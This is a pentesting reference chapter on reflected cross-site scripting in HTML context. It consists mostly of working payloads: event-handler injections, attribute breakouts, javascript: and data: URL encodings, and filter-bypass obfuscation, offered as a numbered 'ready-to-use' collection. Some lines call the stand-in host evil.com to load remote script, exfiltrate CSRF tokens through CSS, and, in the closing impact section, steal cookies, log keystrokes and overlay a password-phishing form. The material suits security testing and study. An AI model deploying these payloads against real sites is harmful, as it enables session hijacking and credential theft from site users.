# 03 - Reflected XSS: HTML Context Injection

## Overview

When user input is reflected between HTML tags or within existing tag attributes, the attacker must introduce new HTML elements or break out of existing attribute contexts to achieve JavaScript execution. HTML context is the most common reflection point and offers the widest attack surface due to the sheer number of tags and event handlers available in HTML5.

**Key Principle**: Always inject a harmless probe first (e.g., `TEST12345<>"'/`) and examine how the response renders it. The characters that survive unencoded determine which injection technique applies.

**Sources**:
- [PortSwigger XSS Cheat Sheet - 2026 Edition](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [HackTricks - XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)

---

## 1. Between-Tags Injection

When input lands between existing HTML tags (e.g., inside a `<div>`, `<p>`, or `<span>`), the attacker can inject entirely new HTML elements.

### 1.1 Script Tag Injection

The most direct approach -- inject a `<script>` block:

```html
<!-- Basic -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script src=//evil.com/x.js></script>

<!-- Obfuscated -->
<script>alert(String.fromCharCode(88,83,83))</script>
<script>onerror=alert;throw 1</script>

<!-- Nested/broken tag bypass -->
<scr<script>ipt>alert(1)</scr<script>ipt>
<<SCRIPT>alert(1);//\<</SCRIPT>

<!-- No closing tag (parser auto-closes) -->
<SCRIPT SRC=//evil.com/x.js?<B>

<!-- Case and whitespace variation -->
<ScRiPt>alert(1)</ScRiPt>
<script/x>alert(1)</script>
<SCRIPT/SRC="http://evil.com/x.js"></SCRIPT>
```

### 1.2 Event Handler Tags (No Script Tag Needed)

When `<script>` is filtered, use any HTML tag with an event handler:

```html
<!-- Image error events -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert(document.domain)">
<img/src=x onerror=alert(1)>
<IMG """><SCRIPT>alert(1)</SCRIPT>"\>

<!-- SVG -->
<svg onload=alert(1)>
<svg/onload=alert(1)//
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Details/Summary (no user interaction needed) -->
<details open ontoggle=alert(1)>
<details/open/ontoggle="alert(1)">

<!-- Input with autofocus (auto-fires, no click needed) -->
<input autofocus onfocus=alert(1)>
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>

<!-- Select -->
<select autofocus onfocus=alert(1)>
<select onfocus=alert(1) autofocus>

<!-- Textarea -->
<textarea autofocus onfocus=alert(1)>
<textarea onfocus=alert(1) autofocus>

<!-- Video/Audio -->
<video src=_ onloadstart=alert(1)>
<video><source onerror=alert(1)>
<audio src onloadstart=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Body (requires controlling full page or early injection) -->
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)>

<!-- Marquee -->
<marquee onstart=alert(1)>

<!-- Object/Embed -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">

<!-- Div with pointer events -->
<div onpointerover=alert(1)>hover</div>
<div onmouseover=alert(1)>hover</div>

<!-- Iframe -->
<iframe onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Math (MathML) -->
<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>

<!-- Button -->
<button autofocus onfocus=alert(1)>
<button onclick=alert(1)>click</button>
```

Source: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

## 2. Comprehensive HTML5 Tags Supporting Event Handlers

The following is a comprehensive catalog of HTML5 elements that support JavaScript event handlers, organized by category. Each tag is tested to fire at least one event handler for XSS.

### 2.1 Auto-Execute Tags (No User Interaction Required)

These tags fire events automatically on load or render:

| Tag | Event Handler | Notes |
|-----|--------------|-------|
| `<script>` | Inline execution | Direct JS execution |
| `<body>` | `onload`, `onfocus`, `onpageshow`, `onhashchange` | Requires body-level injection |
| `<svg>` | `onload` | Inline SVG auto-fires |
| `<img>` | `onerror` (with invalid src) | Most common auto-fire |
| `<input>` | `onfocus` + `autofocus` | Auto-fires without click |
| `<select>` | `onfocus` + `autofocus` | Auto-fires without click |
| `<textarea>` | `onfocus` + `autofocus` | Auto-fires without click |
| `<keygen>` | `onfocus` + `autofocus` | Deprecated, still works in some browsers |
| `<video>` | `onloadstart`, `onloadeddata`, `oncanplay` | Requires src attribute |
| `<audio>` | `onloadstart`, `onerror`, `oncanplay` | Requires src attribute |
| `<details>` | `ontoggle` (with `open`) | Auto-fires when `open` is present |
| `<iframe>` | `onload` | Fires on frame load |
| `<embed>` | `onload` | Limited browser support |
| `<object>` | `onload`, `onerror` | Fires on object load |
| `<marquee>` | `onstart` | Auto-fires on render |
| `<math>` | Context switch to MathML | Used for namespace confusion |
| `<animate>` | `onbegin` (inside SVG) | SVG animation auto-fires |
| `<set>` | `onbegin` (inside SVG) | SVG animation auto-fires |
| `<style>` | `onload` (in some contexts) | Fires after stylesheet loads |
| `<link>` | `onload`, `onerror` | Fires on resource load/error |
| `<source>` | `onerror` (inside video/audio) | Fires on source failure |
| `<track>` | `oncuechange` (inside video) | Fires on cue events |

### 2.2 User-Interaction Tags (Require Click, Hover, Focus, etc.)

| Tag | Event Handlers | Trigger |
|-----|---------------|---------|
| `<a>` | `onclick`, `onmouseover`, `onfocus`, `onmousedown` | Click, hover, focus |
| `<button>` | `onclick`, `onfocus`, `onmousedown` | Click, focus |
| `<div>` | `onclick`, `onmouseover`, `onmouseenter`, `onpointerover` | Various |
| `<span>` | `onclick`, `onmouseover` | Click, hover |
| `<p>` | `onclick`, `onmouseover` | Click, hover |
| `<h1>`-`<h6>` | `onclick`, `onmouseover` | Click, hover |
| `<table>` | `onclick`, `onmouseover` | Click, hover |
| `<td>` | `onclick`, `onmouseover` | Click, hover |
| `<tr>` | `onclick`, `onmouseover` | Click, hover |
| `<form>` | `onsubmit`, `onreset`, `onfocus` | Submit, reset |
| `<label>` | `onclick`, `onmouseover` | Click, hover |
| `<li>` | `onclick`, `onmouseover` | Click, hover |
| `<ul>`, `<ol>` | `onclick`, `onmouseover` | Click, hover |
| `<dl>`, `<dt>`, `<dd>` | `onclick`, `onmouseover` | Click, hover |
| `<fieldset>` | `onclick`, `onfocus` | Click, focus |
| `<legend>` | `onclick`, `onmouseover` | Click, hover |
| `<section>` | `onclick`, `onmouseover` | Click, hover |
| `<article>` | `onclick`, `onmouseover` | Click, hover |
| `<aside>` | `onclick`, `onmouseover` | Click, hover |
| `<nav>` | `onclick`, `onmouseover` | Click, hover |
| `<header>` | `onclick`, `onmouseover` | Click, hover |
| `<footer>` | `onclick`, `onmouseover` | Click, hover |
| `<main>` | `onclick`, `onmouseover` | Click, hover |
| `<figure>` | `onclick`, `onmouseover` | Click, hover |
| `<figcaption>` | `onclick`, `onmouseover` | Click, hover |
| `<blockquote>` | `onclick`, `onmouseover` | Click, hover |
| `<pre>` | `onclick`, `onmouseover` | Click, hover |
| `<code>` | `onclick`, `onmouseover` | Click, hover |
| `<abbr>` | `onclick`, `onmouseover` | Click, hover |
| `<address>` | `onclick`, `onmouseover` | Click, hover |
| `<map>` | `onclick` | Click |
| `<area>` | `onclick`, `onfocus`, `onmouseover` | Click, hover |
| `<canvas>` | `onclick`, `onmouseover` | Click, hover |
| `<output>` | `onclick`, `onfocus` | Click, focus |
| `<progress>` | `onclick` | Click |
| `<meter>` | `onclick` | Click |
| `<summary>` | `onclick` | Click (inside details) |

### 2.3 Comprehensive Event Handler List

All event handlers usable in XSS contexts:

**Mouse Events**: `onclick`, `ondblclick`, `onmousedown`, `onmouseup`, `onmouseover`, `onmousemove`, `onmouseout`, `onmouseenter`, `onmouseleave`, `oncontextmenu`

**Pointer Events**: `onpointerover`, `onpointerenter`, `onpointerdown`, `onpointermove`, `onpointerup`, `onpointerout`, `onpointerleave`, `ongotpointercapture`, `onlostpointercapture`

**Touch Events**: `ontouchstart`, `ontouchend`, `ontouchmove`, `ontouchcancel`

**Keyboard Events**: `onkeydown`, `onkeypress`, `onkeyup`

**Focus Events**: `onfocus`, `onblur`, `onfocusin`, `onfocusout`

**Form Events**: `onchange`, `oninput`, `oninvalid`, `onreset`, `onselect`, `onsubmit`, `onsearch`

**Drag Events**: `ondrag`, `ondragend`, `ondragenter`, `ondragleave`, `ondragover`, `ondragstart`, `ondrop`

**Clipboard Events**: `oncopy`, `oncut`, `onpaste`

**Media Events**: `onabort`, `oncanplay`, `oncanplaythrough`, `ondurationchange`, `onemptied`, `onended`, `onloadeddata`, `onloadedmetadata`, `onloadstart`, `onpause`, `onplay`, `onplaying`, `onprogress`, `onratechange`, `onseeked`, `onseeking`, `onstalled`, `onsuspend`, `ontimeupdate`, `onvolumechange`, `onwaiting`

**Window Events**: `onload`, `onerror`, `onresize`, `onscroll`, `onunload`, `onbeforeunload`, `onhashchange`, `onpageshow`, `onpagehide`, `onpopstate`, `onstorage`, `onoffline`, `ononline`

**Animation/Transition Events**: `onanimationstart`, `onanimationend`, `onanimationiteration`, `ontransitionend`, `ontransitionstart`, `ontransitionrun`, `ontransitioncancel`

**WebKit-Specific**: `onwebkitanimationend`, `onwebkitanimationiteration`, `onwebkitanimationstart`, `onwebkittransitionend`, `onwebkitplaybacktargetavailabilitychanged` (Safari - audio/video)

**Other**: `ontoggle`, `onwheel`, `onscrollend`, `onsecuritypolicyviolation`, `onslotchange`, `onformdata`, `onbeforeinput`

Source: [s0md3v/AwesomeXSS Event Handlers](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/event-handlers.md), [PortSwigger Research](https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet)

---

## 3. Attribute Breakout (Inside Existing Tags)

When input is reflected inside an HTML attribute, the attacker must break out of the attribute context before injecting event handlers or new tags.

### 3.1 Double-Quote Context

```html
<!-- Vulnerable code: <input value="REFLECTED"> -->

<!-- Break out and add event handler -->
" onfocus=alert(1) autofocus "
" onmouseover=alert(1) "
" autofocus onfocus=alert(1) x="

<!-- Break out and inject new tag -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>

<!-- Break out with encoded quotes -->
&quot; onfocus=alert(1) autofocus &quot;
```

### 3.2 Single-Quote Context

```html
<!-- Vulnerable code: <input value='REFLECTED'> -->

' onfocus=alert(1) autofocus '
' onmouseover=alert(1) '
'><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```

### 3.3 No-Quote (Unquoted) Context

```html
<!-- Vulnerable code: <input value=REFLECTED> -->

<!-- Space breaks out of unquoted attributes -->
 onfocus=alert(1) autofocus
 onmouseover=alert(1)
 autofocus onfocus=alert(1)

<!-- Or close the tag -->
><script>alert(1)</script>
><img src=x onerror=alert(1)>
```

### 3.4 Backtick Context (IE-specific)

```html
<!-- Vulnerable code: <input value=`REFLECTED`> (IE only) -->

` onfocus=alert(1) autofocus `
`><script>alert(1)</script>
```

### 3.5 Adding Attributes Without Closing the Tag

When angle brackets `< >` are filtered but quotes are not, inject new attributes into the current tag:

```html
<!-- Vulnerable code: <div class="REFLECTED"> -->

<!-- Add event handler without closing tag -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus tabindex="1
" onclick="alert(1)

<!-- Works in href/src attributes too -->
<!-- Vulnerable: <a href="REFLECTED"> -->
" onclick="alert(1)
javascript:alert(1)
```

Source: [Intigriti - Hunting for Reflected XSS](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-reflected-xss-vulnerabilities)

---

## 4. URL Context Injection

When input is reflected inside URL-accepting attributes (`href`, `src`, `action`, `formaction`, `data`, `background`, `poster`, `codebase`), the `javascript:` pseudo-protocol enables direct code execution.

### 4.1 javascript: Protocol

```html
<!-- Anchor href -->
<a href="javascript:alert(1)">click</a>
<a href="javascript:alert(document.domain)">click</a>
<a href="javascript:void(0)" onclick="alert(1)">click</a>

<!-- Form action / formaction -->
<form action="javascript:alert(1)"><input type=submit>
<form><button formaction="javascript:alert(1)">click</button></form>
<form><input type=submit formaction="javascript:alert(1)">

<!-- Iframe src -->
<iframe src="javascript:alert(1)">

<!-- Object data -->
<object data="javascript:alert(1)">

<!-- Embed src -->
<embed src="javascript:alert(1)">
```

### 4.2 javascript: with Encoding Bypasses

```html
<!-- HTML entity encoding -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>

<!-- Zero-padded entities -->
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">click</a>

<!-- Whitespace/control characters within protocol -->
<a href="java	script:alert(1)">click</a>
<a href="jav&#x09;ascript:alert(1)">click</a>
<a href="jav&#x0A;ascript:alert(1)">click</a>
<a href="jav&#x0D;ascript:alert(1)">click</a>
<a href=" &#14; javascript:alert(1)">click</a>
<a href="javascript&#58;alert(1)">click</a>

<!-- Mixed case -->
<a href="JaVaScRiPt:alert(1)">click</a>
<a href="JAVASCRIPT:alert(1)">click</a>
```

### 4.3 data: URLs

```html
<!-- Data URI with script execution -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

**Note**: Modern Chrome and Firefox block top-level navigation to `data:` URLs, but they still work inside `<iframe>`, `<object>`, and `<embed>` in many browsers.

### 4.4 Protocol-Relative URLs

```html
<!-- Can be used to load external JS -->
<script src=//evil.com/x.js></script>
<img src=//evil.com/x onerror=alert(1)>
```

Source: [Beyond XSS - Dangerous javascript: pseudo protocol](https://aszx87410.github.io/beyond-xss/en/ch1/javascript-protocol/)

---

## 5. CSS Context Injection

When input is reflected inside `<style>` tags or `style` attributes.

### 5.1 Style Attribute Injection

```html
<!-- Legacy IE expression() -- IE7/IE8 only -->
<div style="width:expression(alert(1))">
<div style="background-image:url(javascript:alert(1))">
<img style="xss:expr/*XSS*/ession(alert(1))">

<!-- Modern CSS exfiltration (no JS execution, but data theft) -->
<!-- Attribute selector exfiltration of CSRF tokens -->
<style>
input[name="csrf"][value^="a"] { background: url(https://evil.com/?leak=a); }
input[name="csrf"][value^="b"] { background: url(https://evil.com/?leak=b); }
/* ... one rule per character prefix ... */
</style>

<!-- @import for external stylesheet loading -->
<style>@import url(https://evil.com/steal.css);</style>

<!-- Font-face exfiltration with unicode-range -->
<style>
@font-face { font-family: poc; src: url(https://evil.com/?leak); unicode-range: U+0041; }
body { font-family: poc; }
</style>
```

### 5.2 Style Tag Injection

```html
<!-- Full style block injection -->
<style>.x{background-image:url("javascript:alert(1)");}</style><span class=x></span>
<style>body{background:url("javascript:alert(1)")}</style>

<!-- CSS-based data exfiltration (character-by-character brute force) -->
<style>
input[value^="secret_prefix"] { background: url(https://attacker.com/?token=secret_prefix); }
</style>
```

Source: [HackTricks - CSS Injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection), [OWASP - Testing for CSS Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/05-Testing_for_CSS_Injection)

---

## 6. Alert Alternatives and Execution Obfuscation

When `alert` is blocked by WAF or application filter:

```javascript
// Alternative PoC functions
confirm(1)
prompt(1)
print()                          // opens print dialog
console.log(document.domain)
window.onerror=alert;throw 1

// Indirect calls
(alert)(1)
a=alert,a(1)
[1].find(alert)
[1].map(alert)
top["al"+"ert"](1)
window["alert"](1)
self["alert"](1)

// Constructor abuse
[].constructor.constructor('alert(1)')()
Set.constructor('alert(1)')()

// Template literal calls
alert`1`

// Alternatives using setTimeout/setInterval
setTimeout('alert(1)')
setInterval('alert(1)')
Function('alert(1)')()

// Unicode escapes in identifier names
\u0061lert(1)
al\u0065rt(1)

// Number-to-string radix trick
8680439..toString(30)  // produces "alert"
```

---

## 7. Ready-to-Use Payload Collection (HTML Context)

### Payload Set 1: Auto-Executing (Zero Interaction)

```html
P01: <script>alert(1)</script>
P02: <img src=x onerror=alert(1)>
P03: <svg onload=alert(1)>
P04: <svg/onload=alert(1)//
P05: <details open ontoggle=alert(1)>
P06: <input autofocus onfocus=alert(1)>
P07: <video src=_ onloadstart=alert(1)>
P08: <audio src=x onerror=alert(1)>
P09: <marquee onstart=alert(1)>
P10: <body onload=alert(1)>
P11: <iframe onload=alert(1)>
P12: <math><mtext><img src=x onerror=alert(1)>
P13: <select autofocus onfocus=alert(1)>
P14: <textarea autofocus onfocus=alert(1)>
P15: <svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

### Payload Set 2: Attribute Breakout

```html
P16: " onfocus=alert(1) autofocus "
P17: " onmouseover=alert(1) "
P18: "><script>alert(1)</script>
P19: "><img src=x onerror=alert(1)>
P20: "><svg onload=alert(1)>
P21: '><img src=x onerror=alert(1)>
P22: ' onfocus='alert(1)' autofocus '
P23:  onfocus=alert(1) autofocus
P24: " autofocus onfocus=alert(1) x="
P25: "><details open ontoggle=alert(1)>
```

### Payload Set 3: URL/Protocol Context

```html
P26: javascript:alert(1)
P27: javascript:alert(document.domain)
P28: data:text/html,<script>alert(1)</script>
P29: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
P30: &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
```

### Payload Set 4: Filter/WAF Bypass

```html
P31: <img src=x onerror="window.onerror=alert;throw 1">
P32: <img src=1 onerror=alert(1)//
P33: <ScRiPt>alert(1)</ScRiPt>
P34: <script/x>alert(1)</script>
P35: <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000049&#0000039&#0000041">
P36: <Img src=x onerror="javascript:window.onerror=alert;throw XSS">
P37: <object data="javascript:alert(1)">
P38: <form><button formaction="javascript:alert(1)">X</button></form>
P39: <iframe src="javascript&colon;alert&lpar;1&rpar;">
P40: <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
```

### Polyglot Payload (Works Across Multiple Contexts)

```html
P41: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

Source: [YesWeHack - XSS Attacks & Exploitation Guide](https://www.yeswehack.com/learn-bug-bounty/xss-attacks-exploitation-ultimate-guide), [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

---

## 8. Testing Methodology for HTML Context

### Step 1: Context Identification
Inject `TEST12345<>"'/\` and observe:
- Which characters survive unencoded?
- Where does reflection appear in the DOM?
- Is it between tags, inside an attribute, inside a URL attribute?

### Step 2: Filter Probing
Test which elements and keywords are blocked:
- Try `<script>`, `<img>`, `<svg>`, `<details>`, `<input>`, `<body>`
- Try `onerror`, `onload`, `onfocus`, `onmouseover`, `ontoggle`
- Try `alert`, `confirm`, `prompt`
- Try `javascript:`, `data:`, `vbscript:`

### Step 3: Payload Selection
Based on what passes through:
- If `<script>` allowed --> use script injection payloads
- If event handlers allowed --> use img/svg/details with auto-firing events
- If inside attribute --> use attribute breakout payloads
- If inside URL attribute --> use javascript: protocol with encoding
- If most tags blocked --> enumerate allowed tags with PortSwigger cheat sheet approach

### Step 4: Encoding Bypass
If payloads are partially blocked:
- HTML entity encoding for attribute contexts
- URL encoding for URL parameters
- Double encoding if server decodes twice
- Unicode escapes for JavaScript keywords
- Case variation for tag/attribute names

### Step 5: Impact Demonstration
Escalate from `alert(1)` to real impact:
```javascript
// Cookie theft
fetch('https://evil.com/?c='+document.cookie)
// Session hijacking
new Image().src='https://evil.com/?c='+document.cookie
// Keylogging
document.onkeypress=function(e){fetch('https://evil.com/?k='+e.key)}
// Phishing overlay
document.body.innerHTML='<h1>Session expired</h1><form action=https://evil.com/phish><input name=user><input name=pass type=password><input type=submit></form>'
```
